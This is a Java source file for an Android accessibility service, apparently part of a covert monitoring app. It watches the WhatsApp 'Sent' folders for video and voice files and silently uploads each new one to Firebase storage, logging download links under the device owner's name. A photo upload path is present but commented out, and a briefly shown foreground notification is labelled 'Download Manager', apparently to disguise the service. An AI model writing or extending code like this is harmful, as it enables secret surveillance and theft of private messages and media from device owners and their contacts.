package com.rr.personal.data.service;

import static com.rr.personal.data.App.EXTERNAL_STORAGE;
import static com.rr.personal.data.App.mData;
import static com.rr.personal.data.App.mName;
import static com.rr.personal.data.App.mPhotoData;
import static com.rr.personal.data.App.mPhotoStorage;
import static com.rr.personal.data.App.mVideoData;
import static com.rr.personal.data.App.mVideoStorage;
import static com.rr.personal.data.App.mVoiceData;
import static com.rr.personal.data.App.mVoiceStorage;

import android.accessibilityservice.AccessibilityService;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.FileObserver;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;
import android.view.accessibility.AccessibilityEvent;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;

import com.google.android.gms.tasks.Continuation;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.storage.OnProgressListener;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;
import com.rr.personal.data.RecursiveFileObserver;
import com.rr.personal.data.activity.BackgroundActivity;

import java.io.File;
import java.util.Objects;
import java.util.regex.Pattern;

public class RealTimeService extends AccessibilityService {

    private FileObserver mPhotoObserver;
    private FileObserver mVideoObserver;
    private RecursiveFileObserver mVoiceObserver;

    private String mPhotoPath = "";
    private String mVideoPath = "";
    private String mVoicePath = "";
//
//    private AlarmManager mAlarmManager;

    @Override
    protected void onServiceConnected() {
        Toast.makeText(this, "AccessibilityService", Toast.LENGTH_SHORT).show();
    }

    @Override
    public void onCreate() {
        super.onCreate();

        Toast.makeText(getApplicationContext(), "Start Serveice", Toast.LENGTH_SHORT).show();

        startForeground(9099, new NotificationCompat.Builder(this, "Download Manager").build());

        stopForeground(true);
//
//        mAlarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);

//        Intent intent = new Intent(this, BackgroundActivity.class);
//        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
//        PendingIntent pendingIntent;
//
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
//            pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE);
//        } else {
//            pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
//        }
//
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
//            mAlarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()+1000, pendingIntent);
//        } else {
//            mAlarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()+1000, pendingIntent);
//        }

        mPhotoPath = EXTERNAL_STORAGE()+"/WhatsApp/Media/WhatsApp Images/Sent/";
        mVideoPath = EXTERNAL_STORAGE()+"/WhatsApp/Media/WhatsApp Video/Sent/";
        mVoicePath = EXTERNAL_STORAGE()+"/WhatsApp/Media/WhatsApp Audio/Sent/";


        mPhotoObserver = new FileObserver(mPhotoPath) {
            @Override
            public void onEvent(int event, final String file) {
                try {
                    if(event == FileObserver.CREATE && !file.equals(".probe") && !file.equals(".nomedia")) {
                        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                try {
                                    final String name = Pattern.compile("[^A-Z a-z 0-9]").matcher(file).replaceAll("");
                                    Toast.makeText(getApplicationContext(), name, Toast.LENGTH_SHORT).show();


//                                    reference.putFile(Uri.fromFile(new File(mPhotoPath+file))).addOnProgressListener(new OnProgressListener<UploadTask.TaskSnapshot>() {
//                                        @Override
//                                        public void onProgress(@NonNull UploadTask.TaskSnapshot snapshot) {
//                                            double progress = (100.0*snapshot.getBytesTransferred()/snapshot.getTotalByteCount());
//                                            Log.d("Upload Progress", progress+" "+snapshot.getTotalByteCount());
//                                        }
//                                    }).continueWithTask(new Continuation<UploadTask.TaskSnapshot, Task<Uri>>() {
//                                        @Override
//                                        public Task<Uri> then(@NonNull Task<UploadTask.TaskSnapshot> task) throws Exception {
//                                            Log.d("UploadUpload", task.isSuccessful()+"");
//                                            if (!task.isSuccessful()) {
//                                                throw task.getException();
//                                            }
//                                            return reference.getDownloadUrl();
//                                        }
//                                    }).addOnCompleteListener(new OnCompleteListener<Uri>() {
//                                        @Override
//                                        public void onComplete(@NonNull Task<Uri> task) {
//                                            Log.d("CompleteComplete", task.isSuccessful()+"");
//                                            if (task.isSuccessful()) {
//                                                String url = task.getResult().toString();
//                                                mPhotoData.child(name).setValue(mName+"★★★"+url);
//                                            }
//                                        }
//                                    });
                                } catch (Exception e) {
                                    Log.d("App ErrorError", e.toString());
                                }
                            }
                        }, 2000);
                    }
                } catch (Exception e) {}
            }
        };

        mPhotoObserver.startWatching();

        mVideoObserver = new FileObserver(mVideoPath) {
            @Override
            public void onEvent(int event, final String file) {
                try {
                    if((event == FileObserver.CREATE || event == FileObserver.MOVED_TO) && !file.equals(".probe") && !file.equals(".nomedia")) {
                        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                try {
                                    final String name = Pattern.compile("[^A-Z a-z 0-9]").matcher(file).replaceAll("");
                                    mVideoStorage.child(name).putFile(Uri.fromFile(new File(mVideoPath+file))).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                                        @Override
                                        public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                                            String url = Objects.requireNonNull(Objects.requireNonNull(taskSnapshot.getMetadata()).getReference()).getDownloadUrl().toString();
                                            mVideoData.child(name).setValue(mName+"★★★"+url);
                                        }
                                    });
                                } catch (Exception e) {}
                            }
                        }, 3000);
                    }
                } catch (Exception e) {}
            }
        };

        mVideoObserver.startWatching();

        mVoiceObserver = new RecursiveFileObserver(mVoicePath, new RecursiveFileObserver.EventListener() {

            @Override
            public void onEvent(int event, final File file) {
                try {
                    if((event == FileObserver.CREATE || event == FileObserver.MOVED_TO) && !(file.equals(".probe") || file.equals(".nomedia"))) {
                        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                try {
                                    final String fileName = Uri.parse(file.getAbsolutePath()).getLastPathSegment();
                                    if(!(fileName.equals(".probe") || fileName.equals(".nomedia") || fileName.startsWith("."))) {
                                        final String name = Pattern.compile("[^A-Z a-z 0-9]").matcher(fileName).replaceAll("");
                                        mVoiceStorage.child(name).putFile(Uri.fromFile(file)).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                                            @Override
                                            public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                                                String url = Objects.requireNonNull(Objects.requireNonNull(taskSnapshot.getMetadata()).getReference()).getDownloadUrl().toString();
                                                mVoiceData.child(name).setValue(mName+"★★★"+url);
                                            }
                                        });
                                    }
                                } catch (Exception e) {}
                            }
                        }, 2000);
                    }
                } catch (Exception e) {}
            }
        });

        mVoiceObserver.startWatching();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {

    }

    @Override
    public void onInterrupt() {

    }
}
